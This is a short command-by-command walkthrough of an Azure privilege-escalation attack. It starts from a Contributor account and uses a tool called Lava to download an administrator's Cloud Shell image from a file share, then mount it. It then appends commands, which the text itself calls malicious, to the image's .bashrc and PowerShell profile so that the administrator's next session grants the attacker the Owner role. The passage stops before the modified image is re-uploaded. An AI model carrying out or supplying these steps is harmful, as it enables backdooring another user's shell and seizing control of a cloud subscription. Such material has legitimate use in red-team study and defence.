# Privilege Escalation using the Cloud Shell Account

## Steps

 - az login -u CONTRIBUTOR_USER@DOMAIN.LOCAL -p PASSWORD (Authenticate with the contributor account)

 - python3 lava.py

 - Lava $> exec priv_show (Verify the current user and permissions)

 - Lava $> exec stg_file_scan (Scan the file shares in the Azure subscription for potential Cloud Shell images)

 - Lava $> exec stg_file_download (Downloads the file into a temporary directory. Make note of the download location.)

 - exit

 - mount DOWNLOAD_LOCATION/.cloudconsole/acc_azureadmin.img /mnt (Mount the downloaded image file)

 - ls /mnt/ (Explore the mounted drive with this command, then press tab)

 - cd /mnt (Change directory to the mounted drive)

 - echo "az role assignment create --role "Owner" --assignee $(az ad user list --display-name contributoruser | jq '.[]' | jq -r '.userPrincipalName')" >> .bashrc (Append a malicious command to the .bashrc file to escalate the privileges of our current user)

### Do do the same for a Powershell session we can do:

 - mkdir .config

 - mkdir .config/PowerShell

 - echo "New-AzRoleAssignment -UserPrincipalName (Get-AzADUser -StartsWith contributoruser).UserPrincipalName -RoleDefinitionName Owner" >> .config/PowerShell/Microsoft.PowerShell_profile.ps1 (Same trick as Linux)

 - cd ..

 - umount /mnt (Unmount the drive from your session)

 - az storage account list --query [].name -o tsv

 - storagename=STORAGE_ACCT_NAME

